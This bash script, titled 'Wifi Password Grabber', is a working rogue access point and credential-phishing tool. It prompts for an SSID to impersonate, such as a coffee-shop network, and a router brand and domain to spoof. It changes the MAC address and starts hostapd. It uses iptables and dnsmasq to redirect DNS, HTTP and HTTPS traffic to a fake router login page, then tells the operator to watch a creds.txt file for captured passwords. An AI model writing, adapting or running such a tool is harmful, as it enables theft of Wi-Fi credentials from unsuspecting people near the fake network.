#!/bin/bash

# Color variables
red='\033[0;31m'
green='\033[0;32m'
yellow='\033[0;33m'
blue='\033[0;34m'
magenta='\033[0;35m'
cyan='\033[0;36m'
# Clear the color after that
clear='\033[0m'
cat << "EOF"
 __          ___  __ _                        
 \ \        / (_)/ _(_)                       
  \ \  /\  / / _| |_ _                        
   \ \/  \/ / | |  _| |                       
    \  /\  /  | | | | |                       
  ___\/  \/   |_|_| |_|                    _  
 |  __ \                                  | | 
 | |__) |_ _ ___ _____      _____  _ __ __| | 
 |  ___/ _` / __/ __\ \ /\ / / _ \| '__/ _` | 
 | |  | (_| \__ \__ \\ V  V / (_) | | | (_| | 
 |_|___\__,_|___/___/ \_/\_/ \___/|_|  \__,_| 
  / ____|         | |   | |                   
 | |  __ _ __ __ _| |__ | |__   ___ _ __      
 | | |_ | '__/ _` | '_ \| '_ \ / _ \ '__|     
 | |__| | | | (_| | |_) | |_) |  __/ |        
  \_____|_|  \__,_|_.__/|_.__/ \___|_|        
EOF
echo ""
echo -e ${green}"Which interface do you want to use as your AP NIC? Example: wlan1"${clear}
echo ""
read AP
sleep 1
echo ""
echo -e ${yellow}"Using $AP as your AP interface"${clear}
echo ""
echo -e ${green}"What is the Wifi network you want to spoof? Example: Starbucks Wifi"${clear}
echo ""
read SSID
sleep 1
echo ""
echo -e ${yellow}"Using $SSID as your spoofed network"${clear}
sleep 1
echo ""
echo -e ${green}"What is the router company you want to spoof on your network? Example: NetGear"${clear}
echo ""
read router
sleep 1
echo ""
echo -e ${yellow}"Using $router as your spoofed company"${clear}
sleep 1
echo ""
echo -e ${green}"What is the router company's domain you want to spoof on your network? Example: netgear.com"${clear}
echo ""
read domain
sleep 1
echo ""
echo -e ${yellow}"Using $domain as your spoofed company"${clear}
sleep 1

cp Resources/hosts . 2>/dev/null
cp Resources/hostapd.conf . 2>/dev/null
cp Resources/router.html . 2>/dev/null
cp Resources/router.php . 2>/dev/null
cp Resources/index2.html . 2>/dev/null

sed -i "s/SSID/${SSID}/g" router.html
sed -i "s/AP/${AP}/g" hostapd.conf
sed -i "s/SSID/${SSID}/g" hostapd.conf
sed -i "s/domain/${domain}/g" router.php
sed -i "s/domain/${domain}/g" index2.html
sed -i "s/domain/${domain}/g" hosts

rm /etc/hostapd/hostapd.conf 2>/dev/null
mv hostapd.conf /etc/hostapd/hostapd.conf
mv router.html /var/www/html
mv index2.html /var/www/html/redirect/index.html
mv router.php /var/www/html/
mv hosts /etc/hosts

echo ""
echo -e ${green}"Changing $AP MAC Address"${clear}
echo ""
ifconfig $AP down
macchanger -A $AP
sleep 1
ifconfig $AP up
sleep 1
echo ""
echo -e ${green}"Configuring $AP Into An Access Point"${clear}
echo ""
hostapd -B /etc/hostapd/hostapd.conf
sleep 2
echo ""
echo -e ${green}"Bringing Up The Bridge"${clear}
echo ""
ifconfig br0 up
sleep 2
ifconfig br0 10.1.1.1 netmask 255.255.255.0
sysctl net.ipv4.ip_forward=1
echo ""
echo -e ${green}"Setting IPTables"${clear}
iptables --flush
iptables -t nat --flush
iptables -t nat -A PREROUTING -i br0 -p udp -m udp --dport 53 -j DNAT --to-destination 10.1.1.1:53
iptables -t nat -A PREROUTING -i br0 -p tcp -m tcp --dport 80 -j DNAT --to-destination 10.1.1.1:80
iptables -t nat -A PREROUTING -i br0 -p tcp -m tcp --dport 443 -j DNAT --to-destination 10.1.1.1:443
iptables -t nat -A POSTROUTING -j MASQUERADE
sleep 2
echo ""
echo -e ${green}"Starting Rouge DNS"${clear}
systemctl start dnsmasq
sleep 4
echo ""
echo -e ${red}"Access Point Should Be Up. Watch /var/www/html/creds.txt For Creds"${clear}
echo ""
